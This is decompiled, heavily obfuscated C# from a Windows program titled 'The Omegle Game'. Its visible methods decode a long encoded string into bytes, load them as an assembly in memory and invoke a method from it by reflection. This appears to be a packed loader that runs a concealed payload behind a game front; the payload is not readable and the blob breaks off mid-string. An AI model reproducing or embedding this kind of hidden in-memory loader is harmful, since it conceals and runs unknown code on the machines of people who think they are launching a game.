					num = ((int)num2 * -2112600660) ^ 0x2F532554;
					continue;
				case 15u:
					GForm1.smethod_50(PictureBox_4, bool_3: false);
					GForm1.smethod_32(Timer_1, 1000);
					GForm1.smethod_51((ContainerControl)(object)this, new SizeF(10f, 22f));
					num = ((int)num2 * -136597054) ^ -1546980398;
					continue;
				case 14u:
					num = (int)((num2 * 898775931) ^ 0x5A7C6599);
					continue;
				case 13u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_4);
					num = ((int)num2 * -853154077) ^ 0x4F48E921;
					continue;
				case 12u:
					GForm1.smethod_45((Control)(object)this, (ImageLayout)3);
					GForm1.smethod_54((Form)(object)this, new Size(1025, 638));
					num = ((int)num2 * -1635797648) ^ 0x7FAF282C;
					continue;
				case 11u:
					((Control)this).set_DoubleBuffered(true);
					num = ((int)num2 * -420172231) ^ 0x27EF6C78;
					continue;
				case 10u:
					GForm1.smethod_53((Form)(object)this, Color.White);
					num = ((int)num2 * -1573380387) ^ -1299670417;
					continue;
				case 9u:
					GForm1.smethod_63((Form)(object)this, (FormStartPosition)1);
					GForm1.smethod_64((Form)(object)this, "The Omegle Game");
					num = (int)(num2 * 323201186) ^ -1824917613;
					continue;
				case 8u:
					Timer_1 = GForm1.smethod_41(icontainer_0);
					num = (int)((num2 * 146514715) ^ 0xF1ACF3E);
					continue;
				case 7u:
					GForm1.smethod_50(PictureBox_3, bool_3: false);
					num = (int)((num2 * 57014770) ^ 0x12E16F23);
					continue;
				case 6u:
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_3);
					num = ((int)num2 * -343303584) ^ -587423004;
					continue;
				case 5u:
					num = ((int)num2 * -1931630203) ^ -2144698670;
					continue;
				case 4u:
					num = (int)((num2 * 287643014) ^ 0x2E6286EB);
					continue;
				case 3u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_0);
					num = ((int)num2 * -441063032) ^ -844288335;
					continue;
				case 2u:
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_2);
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_1);
					num = (int)((num2 * 864239137) ^ 0x46F3EC6B);
					continue;
				case 1u:
					GForm1.smethod_46((Control)(object)PictureBox_2, new Point(336, 278));
					num = ((int)num2 * -428699036) ^ 0x60560FB9;
					continue;
				case 0u:
					Timer_0 = GForm1.smethod_41(icontainer_0);
					num = ((int)num2 * -263236914) ^ -409081061;
					continue;
				default:
					return;
				case 62u:
					break;
				case 43u:
					return;
				}
				break;
			}
		}
	}

	private static void smethod_1(Type type_0, int int_2)
	{
		object[] array = new object[3]
		{
			GClass2.String_1,
			GClass2.String_0,
			"The_Omegle_Game"
		};
		MethodInfo object_ = GForm1.smethod_67(type_0)[3];
		GForm1.smethod_68((object)object_, "Invoke", (CallType)2, new object[2] { 0, array });
	}

	private static void smethod_2(Assembly assembly_0)
	{
		int num = 251367102;
		Type type_ = GForm1.smethod_69(assembly_0)[0];
		bool flag = false;
		bool flag2 = default(bool);
		while (true)
		{
			int num2 = -242864772;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0xF2D2B7ADu) % 13u)
				{
				case 12u:
					num = 251367134;
					num2 = ((int)num3 * -305998863) ^ -627669204;
					continue;
				case 11u:
					num2 = ((int)num3 * -653393871) ^ 0x11CDB1FB;
					continue;
				case 10u:
				{
					int num6;
					int num7;
					if (!flag2)
					{
						num6 = 143022449;
						num7 = 143022449;
					}
					else
					{
						num6 = 155746349;
						num7 = 155746349;
					}
					num2 = num6 ^ ((int)num3 * -1488856055);
					continue;
				}
				case 9u:
					smethod_1(type_, 5);
					num2 = ((int)num3 * -87292957) ^ 0x5391B2B8;
					continue;
				case 8u:
					num2 = ((int)num3 * -369587619) ^ -2051744887;
					continue;
				case 7u:
					num = 251367188;
					num2 = (int)(num3 * 1895108510) ^ -430866123;
					continue;
				case 4u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 1242831715;
						num5 = 1242831715;
					}
					else
					{
						num4 = 533457417;
						num5 = 533457417;
					}
					num2 = num4 ^ (int)(num3 * 113323222);
					continue;
				}
				case 3u:
					num = 251367129;
					num2 = ((int)num3 * -380950032) ^ 0x25A7DCB8;
					continue;
				case 2u:
					num2 = (int)(num3 * 1413119759) ^ -1939127088;
					continue;
				case 1u:
					flag2 = num == 251367142;
					num2 = -71127467;
					continue;
				case 0u:
					num2 = -107089424;
					continue;
				default:
					return;
				case 6u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly smethod_3(byte[] byte_0, bool bool_3)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = -1015545123;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAA05D6EAu) % 3u)
				{
				case 2u:
					goto IL_0003;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_0003:
				result = GForm1.smethod_70(byte_0);
				num = (int)((num2 * 164406360) ^ 0x5E3C1261);
			}
		}
	}

	public static string smethod_4(string string_0)
	{
		string string_2 = default(string);
		int num3 = default(int);
		string string_3 = default(string);
		string string_ = default(string);
		string text = default(string);
		string result = default(string);
		while (true)
		{
			int num = 1361654946;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x66CAE02Eu) % 11u)
				{
				case 10u:
					string_2 = string_0;
					num = (int)((num2 * 1387366899) ^ 0x4E560878);
					continue;
				case 9u:
					num3 = 0;
					num = (int)((num2 * 119872518) ^ 0x5C9708F8);
					continue;
				case 8u:
					num = (int)(num2 * 1085052281) ^ -21506572;
					continue;
				case 7u:
				{
					int int_ = checked(GForm1.smethod_73(string_3) - 670);
					string_ = GForm1.smethod_72(GForm1.smethod_74(int_));
					num = ((int)num2 * -1692743693) ^ 0x50E7191;
					continue;
				}
				case 5u:
					string_3 = GForm1.smethod_72(GForm1.smethod_71(string_2, num3));
					num = 673119341;
					continue;
				case 4u:
				{
					int num4;
					if (num3 >= GForm1.smethod_75(string_2))
					{
						num = 1511861231;
						num4 = 1511861231;
					}
					else
					{
						num = 1744438697;
						num4 = 1744438697;
					}
					continue;
				}
				case 3u:
					text = null;
					num = (int)((num2 * 1895568525) ^ 0x3B23D69F);
					continue;
				case 1u:
					result = text;
					num = ((int)num2 * -124564143) ^ 0x61759C35;
					continue;
				case 0u:
					text = GForm1.smethod_14(text, string_);
					num3 = checked(num3 + 1);
					num = (int)(num2 * 2062380300) ^ -796008404;
					continue;
				case 2u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public static string smethod_5(bool bool_3)
	{
		string string_ = default(string);
		string result = default(string);
		string text = default(string);
		while (true)
		{
			int num = 222236959;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x5156559Fu) % 7u)
				{
				case 5u:
				{
					object obj = GForm1.smethod_78(smethod_6(GForm1.smethod_77(string_)));
					Assembly object_ = smethod_3((byte[])obj, bool_3: true);
					smethod_7(object_);
					num = ((int)num2 * -1142507507) ^ 0x5EA3CF80;
					continue;
				}
				case 3u:
					result = text;
					num = ((int)num2 * -925693727) ^ -495089835;
					continue;
				case 2u:
					text = GForm1.smethod_76("\u02f2\u02f4\u030f\u02ef\u200c??\u02eb\u200c??\u200c????\u200c??\u200c??????\u02d6\u200c??\u02ea\u0305\u200c??\u200c??\u200c??\u200c??\u02df\u02ef\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u0305\u200c??\u200c??\u02df\u02d2\u0304\u0313\u0305\u02d2\u02df\u0312\u02df\u030c??\u02e7\u0300\u0305??\u02f2\u02eb??\u0306\u02f4\u02e5\u0306\u030e\u0301\u0317??\u0315\u0301\u030b\u02d7\u030c\u0301\u030b??\u0312\u02e7\u02e5??\u0306\u0300\u030b\u02d3\u0314\u0302????\u0307\u02f8\u02f1??\u0317\u0302\u02f5\u02d2\u0305\u02ff\u02f5\u02d2\u0305\u02f0??\u02d7\u02f2\u02e7\u02e5??\u0314\u02f8\u02e5\u02f3\u0313??\u02ef??\u02e9\u02e8\u200c??\u200c??\u200c??\u200c??\u02df??\u02ef\u02f0\u02ef\u200c??\u02f2\u02df????\u02df\u02e5??\u02e9\u030a\u02f5??\u200c??\u200c??\u200c??\u200c??\u200c??\u02ed\u200c??\u02df\u0307??\u02ea\u02df\u02ef\u0305\u200c????\u030d\u200c??\u200c??\u02e5\u200c??\u200c??\u200c??\u200c????\u030a\u0305\u200c??\u200c??\u0305\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u200c??\u0305\u200c??\u200c??\u02df\u0305\u200c????\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u200c??\u200c??\u200c??\u200c????\u0305\u200c??\u200c??\u02df\u0305\u200c??\u200c??\u200c??\u200c??\u02eb\u02df\u02ef\u02e7\u02f3\u200c????\u200c??\u02df??\u200c??\u200c??\u200c????\u200c??\u02df??\u200c??\u200c??\u200c??\u200c????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02ea\u0316\u02f6\u200c??????\u200c??\u200c??\u02df\u02e5\u200c??\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02e7\u200c??\u200c??\u0315\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02e7\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df????\u200c??\u02df??\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02d3??\u02f8\u02f6\u0306??\u200c??\u200c??????\u0305\u200c??\u200c??\u0305\u200c??\u200c??\u02ed\u0305\u200c??\u200c??\u02e7\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u02df\u02e5\u02df\u0313\u0301\u030c??\u0317\u02f7\u0315\u200c??\u200c??\u02df??\u200c??\u200c??\u02f7\u200c??\u200c??\u02df\u02ef\u200c??\u200c??\u02d6\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u02df??\u02df\u02ea\u030c\u02e8\u030a\u0300\u02e5\u02d7\u0308\u200c??\u02df\u02eb\u200c??\u200c??\u02df\u02e7\u200c??\u200c??\u02df??\u200c??\u200c??\u02ef\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02ef\u200c??\u02df\u02ef\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u0315\u02f4\u0315\u200c??\u200c??\u200c??\u02df??\u0305\u200c??\u200c????\u200c??\u02f3\u02df\u02f7??\u02f7\u200c????\u0315\u02f0\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u02f7\u0305\u0301\u0305\u02e7\u200c??\u02e7????\u200c??\u02df??\u02e8\u0302\u02df??\u200c??\u02df??\u02e9\u02df??\u200c??\u02df\u030f\u200c??\u0305\u200c????????\u0311\u02df\u02ef\u200c??\u0308\u02ef??\u200c??\u02df??\u030a??\u02df\u02eb\u200c??\u02df\u02ef\u030d\u02df\u02ef\u200c????\u030d\u02df??\u200c??\u02df??\u02e9\u0305\u200c??\u02e5\u0318\u02df\u02e5\u02df??\u0311??\u200c??\u02df??\u200c??\u02df\u02f0\u0304\u0305\u02e7\u200c??\u02df\u02ef\u02f2??\u02f6\u02d2??\u200c??\u02df????\u0315\u02d2\u0310\u02e8\u0306??\u02e6\u02f0\u02ef\u02f3\u200c??\u200c??\u02ea\u200c??\u200c????\u0315\u200c??\u200c??\u0311\u200c??\u200c??\u02ea\u200c??\u200c??\u200c??\u200c??\u02df??\u02df??\u200c??\u02df\u02e5\u02e8\u0306\u0301\u02f2??\u0317\u0314\u02ff\u02df\u030c\u02eb??\u200c??\u02df\u02e9??\u0306\u030d\u02f2??\u02f0??\u02e8\u02f0\u02ef\u02f7\u200c??\u200c??\u030f\u200c??\u200c??\u02e8\u02ef\u200c??\u200c??\u200c??\u200c??\u02df\u030a\u200c??\u200c??\u200c??\u200c??\u02df??\u030d\u200c??\u200c??\u02ff\u0308\u02ef\u0305\u200c??\u02df??\u02ea??\u030c\u02f3\u02e6\u200c??\u02df??????\u02f3??\u200c??\u02df\u0300??\u0306\u030d\u0305\u02d5\u0305??\u200c????????\u02df\u02ef\u200c??\u02e9\u02df??\u200c????\u0311\u030b\u02e5\u0316\u02eb\u02e8\u02e9\u02d5\u0301\u02e6\u0302\u02df??\u200c????\u0311\u02f5\u02e7\u02df\u02e7??\u200c??\u02df\u0305\u02f5\u0305??\u200c????\u0305\u02f1\u200c??\u02df\u02e5??\u02df\u02f8????\u0315\u200c??\u02df\u02f0\u02f8\u0318\u02df\u0315\u200c????\u0305??\u02f8??\u0315\u0311\u02f0????\u02f3\u02e5\u200c??\u200c??\u02ea\u200c??\u200c??\u200c??\u200c??\u200c??\u0311\u200c??\u200c??\u200c??\u200c??\u02df??\u0315\u200c??\u200c??\u200c??\u200c??\u02df??\u02e7??\u02e7\u200c??\u02df????\u0315\u02ef\u02e8\u0302\u02df\u0309\u200c??\u02df??\u02f0??\u02e6\u02f3??\u200c??\u02df\u0300??\u0305\u0305\u0305\u0308\u0305??\u200c??????\u0307\u02df\u02ef\u200c??\u02e9\u02df??\u200c????\u0311\u030b\u02e5\u0306\u02eb\u02ea\u02e9\u02d5\u02f3\u02f0??\u02e6\u02f3??\u200c??\u02df\u0300??\u0315\u02f6\u0302\u0318\u200c??\u200c????\u0305\u02f2??\u02f0????\u02f0\u02ef\u0301\u200c??\u200c??\u200c??\u200c??\u02df\u02f0\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u030d\u200c??\u200c??\u030f\u200c??\u200c????\u02f6\u02f3\u02e8\u200c??\u02df??\u02ea??\u02e7\u02f0??\u0307????\u02df\u02ef\u200c??\u0309\u0317\u02df\u02ef??\u0315\u200c??\u02f5\u02f0\u02eb??\u02e9\u02d6\u02eb\u02f0??\u0307??\u0308\u02df\u02ef\u200c??\u0309\u0317????\u0313\u0315\u200c??\u02f5\u02f1\u0314\u0311??\u02f6\u02f3\u02e8\u200c??\u02df??\u0300\u0315\u02ef\u200c??\u02df\u030d\u02f0??\u0306\u02d7\u02f4\u0309\u0317??\u0302??\u02ef\u200c??\u02f5\u02f0\u02eb??\u02e9\u02d3\u030c\u0301\u02e5??\u02eb\u02ef??\u02f0??????\u0315\u200c??\u02df????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u030d\u200c??\u200c??\u02e5\u0302\u02df\u0301\u200c??\u02df??\u0311??\u0306??\u02ed\u02e7\u02e7\u02f7??\u200c????\u02f2\u02e7??\u0304\u0314\u200c????\u02f8??\u0316\u02df\u0310\u0315\u0316\u0315\u0310??\u02ef\u02f8????\u0315\u200c??\u02df\u02f5\u02d6??\u200c??\u02df\u02e9??\u02f0??\u0305\u02e9\u02df\u02e7\u200c??\u02e8\u02eb\u0305\u02df??\u02f3\u200c????\u0309\u02f2????\u0313\u0308????\u02f7\u02f2??\u0316??\u02f2\u02f0\u02ef\u02f3\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????????\u0302\u02ef??\u200c????\u0311\u030f\u02df??????\u200c??\u02df??\u200c??\u200c??\u0310\u02ef\u200c??\u02df??\u0315\u200c??\u200c??\u02e8\u02df\u02ef\u200c??\u02ff\u0315\u200c??\u200c??\u200c??\u200c??\u02df??\u200c??\u200c????\u02ef\u200c??\u02df??\u0301??\u200c??????\u02df\u02ef\u200c??\u02f7\u02ef\u200c??\u200c??\u200c??\u200c??\u02df\u02f2\u02eb\u02df\u02f3\u02df\u030c\u0305??\u200c??\u02df\u02e7\u200c??????????\u200c??\u02df????\u02eb\u02e9\u0304\u0305\u02e7\u200c??\u02df\u02ef\u02f2??\u0317\u0312\u02f5??\u02ef\u030a????\u02ef\u200c??\u02df??\u02ef??\u200c????\u030b\u200c??\u200c??\u200c??\u200c??\u02df\u02ed\u02f7\u200c??\u200c??\u02ea\u200c??\u200c????\u0305\u200c??\u02df\u02e6\u02f7\u200c??\u02df????\u200c??\u200c??\u02e7\u0315??\u200c????\u200c??\u200c??\u02df\u02d5\u02df\u02ef\u200c??\u02f4\u200c??\u200c??\u02e5\u02ef\u200c??\u200c??\u200c??\u200c??\u02df\u0311\u0315\u200c??\u02df\u02e8\u02eb\u200c??\u02df??\u02ef\u200c??\u200c????\u02df\u02eb\u200c??\u02df\u02f7\u030b\u02e5\u0306\u02eb\u02e8\u02e9\u02d4\u030d\u0305\u0301\u02df\u02e7\u200c????\u02df\u02e9\u02df\u0305\u200c??\u02e9??\u02ef\u200c??\u02df\u02f7??\u02e7\u02ea\u02d6\u200c??\u200c??\u0305\u030f\u02ef\u200c??\u02df??\u0305??\u200c??\u02df\u0310??\u0306??\u02e9\u02e7????\u200c??\u02df??\u02f2\u02e7\u02e7\u02f2\u0310\u200c????\u02f8??\u0315\u0309\u02d2\u0302\u0304??????\u0315\u02e7??\u0308\u030b\u0309\u02f6\u02f5\u02f8??\u0304\u0301\u02e5??\u02ea\u02e6\u0315\u0311\u02f2??\u02f2\u0306\u0306????????\u02df\u030d\u02d3\u030e????\u0307????\u200c??\u200c??\u02ef\u0315\u02f5??\u02f0\u02f7\u02f2??????\u02ea\u02e6??\u02f1\u02f2\u02e7\u02e7\u02df\u02f8\u200c????\u02f8??\u0315\u0309\u02d2??????????\u0315\u0305\u02f0??\u02df\u02e7\u02f0??\u02e8??\u02e6\u02f7\u02ef\u02f8??\u02df\u02ef\u200c??\u02e5\u0315\u030b\u02f0\u02f7\u0302\u02e9\u0301\u02e6\u0315\u02d6\u02f2??\u02f2\u0305\u0307??????????\u02ef\u02eb\u0305??\u0315\u02e7\u200c????????\u02df\u0305\u200c??\u02e9\u02df\u02eb\u200c????\u0311\u02f6\u02f5\u0304\u02d2????\u0315\u02f3\u0304??\u0306\u02eb\u02e8\u02ed\u02df\u02ea??????\u02d6\u02f0??\u02f1\u0315\u02e8\u02e6\u0316\u02df\u02f2??\u02f2\u0308????\u0314??????\u02ef\u0311\u0305\u02ff\u0315??\u200c??\u02e8\u02eb\u0305\u02d4\u0307\u030d\u200c????\u0309\u0310\u02d4\u02f0\u02f7??\u02e5\u02f0\u02eb\u02e8\u02ed??\u0314??????\u02d6\u02e8????\u0305??\u02e5\u02f0\u02eb\u02e8\u02ed\u02eb????????\u02d6\u02f0????\u0302\u02f7??\u0315\u02ef\u02f0??\u0316\u02d7\u02d6\u0309\u0317??\u0301\u02d2\u0315\u200c??\u02f5\u02f0\u02eb\u02e8\u02ed\u02ea\u0304??????\u02d6\u02f0??\u02df\u02e9\u02ed\u02ff\u02f0\u0302\u02f8??\u0305\u02e7\u02f5??\u0305??\u02f2??\u0306\u02f7\u02f2??\u02f2\u0307\u0306??\u0314??????\u02ef\u02f7\u0312????\u02d2\u02f2??\u02f2\u0307\u02f4??\u0314????\u02e6??\u0314????\u0305\u02e7??\u0308\u030b\u0309\u02f6\u02f5\u02f1\u0305??\u200c??\u02df\u0310????\u02eb\u02e6\u02e6\u0315\u030d\u02f2??\u02f2\u0306\u02d4??\u0314??????\u02ef\u0302??\u02df\u02ef\u200c??\u02e5\u0317\u030d\u200c????\u02eb\u0315??\u200c????\u02df\u0305\u200c??\u02df\u0315\u200c????\u02f6\u02d2??\u200c??\u02df????\u0315\u0316??\u02df\u0305\u200c??????\u02eb??\u02e9??\u0315\u02f0????\u02f3\u02ef\u200c??\u200c??\u02f5\u0305??\u200c????\u030d??\u200c????\u200c??\u200c??\u02df\u0307\u0305??\u200c??\u02e6????\u200c????\u02e9\u02df\u02ef\u200c??\u0318\u0315\u200c??\u02df\u02ea\u0315??\u200c??????\u200c??\u200c??\u200c??\u200c??\u02df\u02e8\u0301??\u200c????\u0311\u200c??\u200c??\u02e5\u0315\u200c??\u02df\u02e5\u02eb??\u200c??\u02df\u02f4\u200c??\u200c??\u02f4\u0315\u200c??\u02df??\u02df??\u200c??\u02df\u02e5\u02e8\u0306??\u02eb\u02e6\u0317\u02d4\u02f2\u02e7??\u0312??\u200c????\u02f8??\u0315\u0311\u0310\u030e\u02e6\u02eb\u02e5\u200c??\u02df\u02e9??\u0305\u02e7\u0305\u0305\u0315\u02e7\u200c??????\u0310\u02df\u0305\u200c??\u02e9\u02df\u02f3\u200c????\u0311\u02f6??\u0305\u0311\u02f0????\u02d6\u02ed\u0309\u0317\u02df\u02f0\u02f0\u0315\u200c??\u02f5\u02f0\u02eb\u02ea\u02ed\u02e6\u030c??????\u02d6\u02f5??????\u02eb\u02e7??\u02d2??\u200c????\u02f2\u02e7??\u02f4\u0307\u200c????\u02f8??\u0315\u0311\u02d2\u02f7\u0314??????\u0315\u02e7\u0305\u02f8\u02ef??\u200c????\u02df\u02eb\u02df\u02ef\u200c??\u02e9\u02df\u02f3\u200c????\u0311\u02f6??\u0305??\u02f5??\u0315\u02ef\u02f0??\u02f1\u02df\u0306\u02df\u02ef\u200c??\u0309\u0317????\u02f7\u02ef\u200c??\u02f5\u02f0\u02eb\u02ea\u02ed??\u0304??????\u02d6??????????\u02e7??\u02d6??\u200c??\u02df\u0305\u0314\u0305\u02e7\u200c????\u0305\u02e5\u200c??\u02df\u0310??\u0315\u02f3\u02f0??\u02f0\u02f7\u02f5??\u0306\u02f7\u0305\u0314\u0315??\u200c????????\u02df\u02ef\u200c??\u02e9\u02df\u0315\u200c??\u02df\u02f7\u0305??\u02ef\u200c??\u02df????\u0313\u200c??\u200c??\u02e9??\u02f3\u200c??\u02df\u02f7\u02f2??\u0306??\u02eb\u02e6??\u030b\u02f2\u02e7??\u030c\u02f7\u200c????\u02f8??\u0315\u0311\u02d2\u02d4\u0314\u02d5????\u0316??\u02e5\u02ea??\u02f3\u02f0??????\u02f6\u02df\u02ef\u200c??\u0309\u0317??\u030f??\u200c??\u02df\u02f5\u02f0\u02eb\u02ea\u02ed??\u02e6??????\u02d6\u0304??\u02f1\u0314????\u030c\u02f3??\u200c??\u02df????\u030c\u02ef??\u200c??\u02df??\u02e7\u02eb\u02e7??\u200c??\u02df\u0305\u030b\u02df\u02eb\u200c????\u0305\u02e6\u200c??\u02df\u0310\u02e5\u02f7??\u02e7\u200c??\u02df??\u02e8\u02f0\u02f7\u02f1??\u02f0\u02d6\u0303\u02e6??\u02ef\u030d??\u02ef\u200c????\u030e\u0315\u030a??\u0316\u02e7??\u02e7\u02e7\u0309\u200c??\u200c??\u0305\u02d2\u0305\u200c??\u02df??\u0305??\u200c??\u02df\u02e5\u030c??\u02f3\u02f7??\u0305\u02f3\u0305\u0309\u0305??\u200c????????\u02df\u02ef\u200c??\u02e9\u02df??\u200c??\u02df\u02ff\u0301\u02e7\u02e9\u0315??\u200c??\u02df\u0305\u0307\u0315??\u200c????\u0305\u02e7\u200c??\u02df\u0310??\u0316\u02eb\u02ea\u02ed??????????\u02d6\u0304??\u02f0\u02eb\u02ea\u02ed??\u0300??????\u02d6\u02f0????\u0304\u02f5??\u0315\u02ef\u02ff??\u0315\u0311\u02d2\u02f1??\u02d5????\u0316??????\u0304\u02d2????\u0314\u02d2????\u0315\u0301\u02f0??\u0317??\u02e7\u02e5\u02f0\u02eb\u02ea\u02ed??\u02ea??????\u02d6\u0303\u02e9??\u02f7\u02e7??\u02d7\u02f7\u02eb\u02e6\u0315\u030d\u02f2??\u0318\u0305\u0307??\u0314??????\u02df\u0304??\u02df\u0306\u0300??\u02df\u02f0\u02eb\u02e7??\u02ef\u0305\u0312??????\u02f2??\u0318\u0305????\u0314??????\u02ef\u0315\u0305\u0314\u0305\u200c??\u02df\u02e8\u02eb\u0305\u030e\u0305\u200c??\u02df??\u0309\u0310\u02d4\u02ef\u02f8????\u0315\u200c??\u02df\u0302\u02df\u02e7\u200c??\u02df??\u02e9\u02df\u0301\u200c??\u02df\u030e\u0314??\u200c??\u02df??\u030c\u02ef??\u200c??\u02df\u0300??\u0315\u0309\u02f0??\u02f6\u02ef??\u200c??\u02df\u0300\u02e9\u0305\u02df\u02f2\u02eb\u02df\u02f3\u02df\u030a\u200c??\u200c??\u02df\u02ef\u200c??????????\u200c??\u02df????\u02eb??\u02e9\u0318\u02e7\u02e8\u02f0\u02ef\u02f7\u200c??\u200c??\u02f3\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02f3\u200c??\u200c??\u200c??\u200c??\u02df??\u200c??\u200c????\u02ef??\u02ef\u200c????\u0307\u02f7\u02f0????\u02d7\u02e6\u0309\u0317\u02df\u0309\u02f4\u02ef\u200c??\u02f5\u02ef??\u0310\u0318\u0305??\u02ef??\u0305\u200c??\u02df\u0307\u0305\u02e6\u200c??\u02df\u02e9\u02e7\u02df??\u02e8\u02d2??\u02ef\u0304??????\u030d??\u0305\u200c????\u0307??\u02f5\u200c??\u200c??\u02e7??\u02eb\u200c??\u200c??\u030d??\u02ef\u200c??\u02e9\u0317\u02df\u030c\u02df\u0305\u200c??\u02e7??\u0315??\u200c??\u02df\u030d??\u0315\u200c????\u030c\u02eb\u02e8\u200c??\u02df\u02e9??\u0306\u0309??\u02e9\u02d2\u02d2\u02e5\u0302\u02f0\u02f3\u200c??\u02df????\u0300\u0315\u030d\u200c??\u02df\u030e????\u02ef\u200c??\u02df\u02ef\u0311\u02e6\u0302????\u200c??\u02df??\u030f??\u0318\u02df\u02e6\u02df??\u02e7??\u200c??\u02df??\u200c??\u02df\u02f0\u0304\u0305\u02ef\u200c??\u02df\u02ef\u02f2??\u02f6\u02d2??\u200c??\u02df????\u0315\u030d\u0300??\u0315\u0305\u02f0????\u02f3\u02e7\u200c??\u200c??\u02e7\u02ef\u200c??\u02df??\u0315\u200c??\u02df????\u200c??\u200c??\u02f5\u0315\u200c??\u02df\u02ea\u0301\u200c??\u200c??\u200c??\u200c??\u02df\u02f5\u0315\u200c??\u02df\u02ea\u0301\u200c??\u200c??\u0305\u030c\u02e5\u02eb\u200c??????\u0309\u02df\u02ef\u200c??\u02e7??\u0305??\u200c??\u02df\u030d??\u02ef\u200c????\u0305\u02e7??\u02e9\u02df\u02f3\u200c??\u02df\u02f7\u02e9??\u0306\u02eb\u02e7\u02e9\u02d5\u0305\u02e5\u0302\u02f0??\u200c??\u02df??\u030d??\u200c??\u02df??\u0305\u0311\u02e6\u0302\u02df??\u200c????\u0311??\u02e9\u02df\u02eb\u200c??\u02df\u02f7\u02eb??\u02e6\u02f3??\u200c??\u02df\u0300\u02e9\u02df\u02e7\u200c??\u02df\u02f7????\u02ef\u0309\u0305\u030a\u02ef\u200c??\u02df\u02e8\u02eb\u0305\u0308\u0307\u0301\u200c????\u0309\u02f2????\u0306????????????\u02f6\u02f3??\u200c??\u02df\u0300\u02e7\u02e7\u02df??\u200c??\u02df\u0305\u0314\u0305??\u200c????\u0305\u02ef\u200c??\u02df\u02e5??\u0315\u02ef\u02f0??\u02e6\u02ef\u02f5\u200c??\u02df????\u02df\u02f3\u200c??\u02df\u02e7\u030d??\u0315\u200c????\u0307\u02df??\u02f1\u0303????\u02e5\u02f0\u030d\u030d??\u0305\u200c????\u0306\u0305\u02f3\u02e7\u02eb\u02d6\u200c??\u200c??\u0305\u02d4\u02ef\u200c??\u02df??\u0305\u02e9\u200c??\u02df\u0310??\u0315\u02f3\u02f0??\u0307??\u0318\u200c??\u200c??\u0309\u0317??\u0302??\u0315\u200c??\u02f5\u02f0\u02eb\u02e7\u02ed??\u02ea??????\u02d6\u02f0??\u0302\u02df??\u200c??\u02df??\u02e9\u02df\u0301\u200c??\u02df\u030d\u0305????\u030c\u0308\u02f0??\u02d6\u02ea\u02e5\u0307\u0305\u02e9\u200c??\u02df\u02e5\u02e5??\u0307????\u02ef\u200c??\u02df\u02f1\u02f3\u02f5??\u030d\u0315\u02f7\u200c??\u02df??\u030d\u0307\u0305\u02ea\u200c??\u02df\u02e9??\u0315\u02f7\u02f0??\u0307??\u030a\u200c??\u200c??\u0309\u0317\u02df\u02e6\u030f\u200c??\u02df\u02f5\u02f0\u02eb\u02e7\u02ed??????????\u02d6\u02f5\u02e9\u02df\u0315\u200c??\u02df\u030d\u030f??\u02df\u02f7\u200c??\u02df\u02f7\u030b\u02e9\u0305\u200c??\u02ed\u0305\u02e7\u030d??\u02ef\u200c????\u0307\u0310\u02ef??\u0315\u200c????\u0307\u02f7\u030f\u02df??\u02eb\u0315\u02df\u0305\u02df\u0302\u02df\u02ef\u200c????\u0305\u200c????\u02f6\u02d2??\u200c??\u02df????\u0315\u02f4????\u200c??\u02df????\u02eb\u02e5\u02e9??\u02f7\u02f0????\u02f3??\u200c??\u200c????\u0315\u200c??\u02df????\u200c??\u02df??\u02d5\u200c??\u200c??\u200c??\u200c??\u02df\u02e7\u2